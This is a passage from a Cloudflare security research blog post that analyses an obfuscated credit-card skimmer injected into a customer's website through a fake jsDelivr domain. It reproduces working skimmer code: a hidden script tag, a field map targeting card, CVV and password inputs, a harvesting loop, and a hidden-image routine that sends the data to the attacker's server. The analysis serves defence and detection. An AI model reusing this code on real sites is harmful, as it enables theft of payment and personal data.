	<p>The Cloudflare security research team reviews and evaluates scripts flagged by <a href="https://developers.cloudflare.com/page-shield">Cloudflare Page Shield</a>, focusing particularly on those with low scores according to our machine learning (ML) model, as <a href="https://developers.cloudflare.com/page-shield/how-it-works/malicious-script-detection/#malicious-script-detection">low scores indicate the model thinks they are malicious</a>. It was during one of these routine reviews that we stumbled upon a peculiar script on a customer’s website, one that was being fetched from a zone unfamiliar to us, a new and uncharted territory in our digital map.</p>
	<p>This script was not only obfuscated but exhibited some suspicious behavior, setting off alarm bells within our team. Its complexity and the mysterious nature piqued our curiosity, and we decided to delve deeper, to unravel the enigma of what this script was truly up to.</p>
	<p>In our quest to decipher the script's purpose, we geared up to dissect its layers, determined to shed light on its hidden intentions and understand the full scope of its actions.</p>
	<p>The Infection Mechanism: A seemingly harmless HTML <code>div</code> element housed a piece of JavaScript, a trojan horse lying in wait.</p>
	<pre class="language-bash"><code class="language-bash">&lt;div style="display: none; visibility: hidden;"&gt;
&lt;script src="//cdn.jsdelivr.at/js/sidebar.min.js"&gt;&lt;/script&gt;
&lt;/div&gt;</code></pre>
	<p><i>The script was the conduit for the malicious activities</i></p>
	<h2>The devil in the details</h2>
	<p>The script hosted at the aforementioned domain was a piece of obfuscated JavaScript, a common tactic used by attackers to hide their malicious intent from casual observation. The obfuscated code can be examined in detail through the <a href="https://radar.cloudflare.com/scan/6cc5856d-f16d-496d-bfe0-f635bd75bec8/summary">snapshot</a> provided by Cloudflare Radar URL Scanner.</p>
	<p>Obfuscated script snippet:</p>
	<pre class="language-javascript"><code class="language-javascript">function _0x5383(_0x411252,_0x2f6ba1){var _0x1d211f=_0x1d21();return _0x5383=function(_0x5383da,_0x5719da){_0x5383da=_0x5383da-0x101;var _0x3d97e9=_0x1d211f[_0x5383da];return _0x3d97e9;},_0x5383(_0x411252,_0x2f6ba1);}var _0x11e3ed=_0x5383;(function(_0x3920b4,_0x32875c){var _0x3147a9=_0x5383,_0x5c373e=_0x3920b4();while(!![]){try{var _0x5e0fb6=-parseInt(_0x3147a9(0x13e))/0x1*(parseInt(_0x3147a9(0x151))/0x2)+parseInt(_0x3147a9(0x168))/0x3*(parseInt(_0x3147a9(0x136))/0x4)+parseInt(_0x3147a9(0x15d))/0x5*(parseInt(_0x3147a9(0x152))/0x6)+-parseInt(_0x3147a9(0x169))/0x7*(-parseInt(_0x3147a9(0x142))/0x8)+parseInt(_0x3147a9(0x143))/0x9+-parseInt(_0x3147a9(0x14b))/0xa+-parseInt(_0x3147a9(0x150))/0xb;if(_0x5e0fb6===_0x32875c)break;else _0x5c373e['push'](_0x5c373e['shift']());}catch(_0x1f0719){_0x5c373e['push'](_0x5c373e['shift']());}}}(_0x1d21,0xbc05c));function _0x1d21(){var _0x443323=['3439548foOmOf',

	<p>The primary objective of this script was to steal Personally Identifiable Information (PII), including credit card details. The stolen data was then transmitted to a server controlled by the attackers, located at <a href="https://jsdelivr/[./]at/f/[./]php">https://jsdelivr\[.\]at/f\[.\]php</a>.</p>
	<h2>Decoding the malicious domain</h2>
	<p>Before diving deeper into the exact behaviors of a script, examining the hosted domain and its insights could already reveal valuable arguments for overall evaluation. Regarding the hosted domain <code>cdn.jsdelivr.at</code> used in this script:</p>
	<ul>
		<li>
			<p>It was registered on 2022-04-14.</p>
		</li>
		<li>
			<p>It impersonates the well-known hosting service <a href="https://www.jsdelivr.com">jsDelivr</a>, which is hosted at <code>cdn.jsdelivr.net</code>.</p>
		</li>
		<li>
			<p>It was registered by 1337team Limited, a company known for providing bulletproof hosting services. These services are frequently utilized in various cybercrime campaigns due to their resilience against law enforcement actions and their ability to host illicit activities without interruption.</p>
		</li>
		<li>
			<p>Previous mentions of this hosting provider, such as in a tweet by <a href="https://twitter.com/malwrhunterteam/status/1374703390748520448">@malwrhunterteam</a>, highlight its involvement in cybercrime activities. This further emphasizes the reputation of 1337team Limited in the cybercriminal community and its role in facilitating malicious campaigns.</p>
		</li>
	</ul>
	<h2>Decoding the malicious script</h2>
	<p>Data Encoding and Decoding Functions: The script uses two functions, <code>wvnso.jzzys</code> and <code>wvnso.cvdqe</code>, for encoding and decoding data. They employ Base64 and URL encoding techniques, common methods in malware to conceal the real nature of the data being sent.</p>
	<pre class="language-js"><code class="language-js">var wvnso = {
  "jzzys": function (_0x5f38f3) {
    return btoa(encodeURIComponent(_0x5f38f3).replace(/%([0-9A-F]{2})/g, function (_0x7e416, _0x1cf8ee) {
      return String.fromCharCode('0x' + _0x1cf8ee);
    }));
  },
  "cvdqe": function (_0x4fdcee) {
    return decodeURIComponent(Array.prototype.map.call(atob(_0x4fdcee), function (_0x273fb1) {
      return '%' + ('00' + _0x273fb1.charCodeAt(0x0).toString(0x10)).slice(-0x2);
    }).join(''));
  }</code></pre>
	<p>Targeted Data Fields: The script is designed to identify and monitor specific input fields on the website. These fields include sensitive information like credit card numbers, names, email addresses, and other personal details. The <code>wvnso.cwwez</code> function maps these fields, showing that the attackers had carefully studied the website’s layout.</p>
	<pre class="language-js"><code class="language-js">"cwwez": window.JSON.parse(wvnso.cvdqe("W1siZmllbGQiLCAiaWZyYW1lIiwgMCwgIm4iLCAiTnVtYmVyIl0sIFsibmFtZSIsICJmaXJzdG5hbWUiLCAwLCAiZiIsICJIb2xkZXIiXSwgWyJuYW1lIiwgImxhc3RuYW1lIiwgMCwgImwiLCAiSG9sZGVyIl0sIFsiZmllbGQiLCAiaWZyYW1lIiwgMCwgImUiLCAiRGF0ZSJdLCBbImZpZWxkIiwgImlmcmFtZSIsIDAsICJjIiwgIkNWViJdLCBbImlkIiwgImN1c3RvbWVyLWVtYWlsIiwgMCwgImVsIiwgImVtYWlsIl0sIFsibmFtZSIsICJ0ZWxlcGhvbmUiLCAwLCAicGUiLCAicGhvbmUiXSwgWyJuYW1lIiwgImNpdHkiLCAwLCAiY3kiLCAiY2l0eSJdLCBbIm5hbWUiLCAicmVnaW9uX2lkIiwgMywgInNlIiwgInN0YXRlIl0sIFsibmFtZSIsICJyZWdpb24iLCAwLCAic2UiLCAic3RhdGUiXSwgWyJuYW1lIiwgImNvdW50cnlfaWQiLCAwLCAiY3QiLCAiQ291bnRyeSJdLCBbIm5hbWUiLCAicG9zdGNvZGUiLCAwLCAienAiLCAiWmlwIl0sIFsiaWQiLCAiY3VzdG9tZXItcGFzc3dvcmQiLCAwLCAicGQiLCAicGFzc3dvcmQiXSwgWyJuYW1lIiwgWyJzdHJlZXRbMF0iLCAic3RyZWV0WzFdIiwgInN0cmVldFsyXSJdLCAwLCAiYXMiLCAiYWRkciJdXQ==")),</code></pre>
	<p>Data Harvesting Logic: The script uses a set of complex functions ( <code>wvnso.uvesz</code>, &nbsp;<code>wvnso.wsrmf</code>, etc.) to check each targeted field for user input. When it finds the data it wants (like credit card details), it collects ("harvests") this data and gets it ready to be sent out ("exfiltrated").</p>
	<pre class="language-js"><code class="language-js">"uvesz": function (_0x52b255) {
    for (var _0x356fbe = 0x0; _0x356fbe &lt; wvnso.cwwez.length; _0x356fbe++) {
      var _0x25348a = wvnso.cwwez[_0x356fbe];
      if (_0x52b255.hasAttribute(_0x25348a[0x0])) {
        if (typeof _0x25348a[0x1] == "object") {
          var _0xca9068 = '';
          _0x25348a[0x1].forEach(function (_0x450919) {
            var _0x907175 = document.querySelector('[' + _0x25348a[0x0] + "=\"" + _0x450919 + "\"" + ']');
            if (_0x907175 != null &amp;&amp; wvnso.wsrmf(_0x907175, _0x25348a[0x2]).length &gt; 0x0) {
              _0xca9068 += wvnso.wsrmf(_0x907175, _0x25348a[0x2]) + " ";
            }
          });
          wvnso.krwon[_0x25348a[0x4]] = _0xca9068.trim();
        } else {
          if (_0x52b255.attributes[_0x25348a[0x0]].value == _0x25348a[0x1] &amp;&amp; wvnso.wsrmf(_0x52b255, _0x25348a[0x2]).length &gt; 0x0) {
            if (_0x25348a[0x3] == 'l') {
              wvnso.krwon[_0x25348a[0x4]] += " " + wvnso.wsrmf(_0x52b255, _0x25348a[0x2]);
            } else {
              if (_0x25348a[0x3] == 'y') {
                wvnso.krwon[_0x25348a[0x4]] += '/' + wvnso.wsrmf(_0x52b255, _0x25348a[0x2]);
              } else {
                wvnso.krwon[_0x25348a[0x4]] = wvnso.wsrmf(_0x52b255, _0x25348a[0x2]);
              }
            }
          }
        }
      }
    }
  }</code></pre>
	<p>Stealthy Data Exfiltration: After harvesting the data, the script sends it secretly to the attacker's server (located at <a href="https://jsdelivr/[./]at/f/[./]php">https://jsdelivr\[.\]at/f\[.\]php</a>). This process is done in a way that mimics normal Internet traffic, making it hard to detect. It creates an Image HTML element programmatically (not displayed to the user) and sets its src attribute to a specific URL. This URL is the attacker's server where the stolen data is sent.</p>
	<pre class="language-js"><code class="language-js">"eubtc": function () {
    var _0x4b786d = wvnso.jzzys(window.JSON.stringify(wvnso.krwon));
    if (wvnso.pqemy() &amp;&amp; !(wvnso.rnhok.indexOf(_0x4b786d) != -0x1)) {
      wvnso.rnhok.push(_0x4b786d);
      var _0x49c81a = wvnso.spyed.createElement("IMG");
      _0x49c81a.src = wvnso.cvdqe("aHR0cHM6Ly9qc2RlbGl2ci5hdC9mLnBocA==") + '?hash=' + _0x4b786d;
    }
  }</code></pre>
	<p>Persistent Monitoring: The script keeps a constant watch on user input. This means that any data entered into the targeted fields is captured, not just when the page first loads, but continuously as long as the user is on the page.</p>
	<p>Execution Interval: The script is set to activate its data-collecting actions at regular intervals, as shown by the <code>window.setInterval(wvnso.bumdr, 0x1f4)</code> function call. This ensures that it constantly checks for new user input on the site.</p>
	<pre class="language-js"><code class="language-js">window.setInterval(wvnso.bumdr, 0x1f4);</code></pre>
	<p>Local Data Storage: Interestingly, the script uses local storage methods (wvnso.hajfd, wvnso.ijltb) to keep the collected data on the user's device. This could be a way to prevent data loss in case there are issues with the Internet connection or to gather more data before sending it to the server.</p>
	<pre class="language-js"><code class="language-js">"ijltb": function () {
    var _0x19c563 = wvnso.jzzys(window.JSON.stringify(wvnso.krwon));
    window.localStorage.setItem("oybwd", _0x19c563);
  },
  "hajfd": function () {
    var _0x1318e0 = window.localStorage.getItem("oybwd");
    if (_0x1318e0 !== null) {
      wvnso.krwon = window.JSON.parse(wvnso.cvdqe(_0x1318e0));
    }
  }</code></pre>
	<p>This JavaScript code is a sophisticated tool for stealing sensitive information from users. It's well-crafted to avoid detection, gather detailed information, and transmit it discreetly to a remote server controlled by the attackers.</p>
	<h2>Proactive detection</h2>
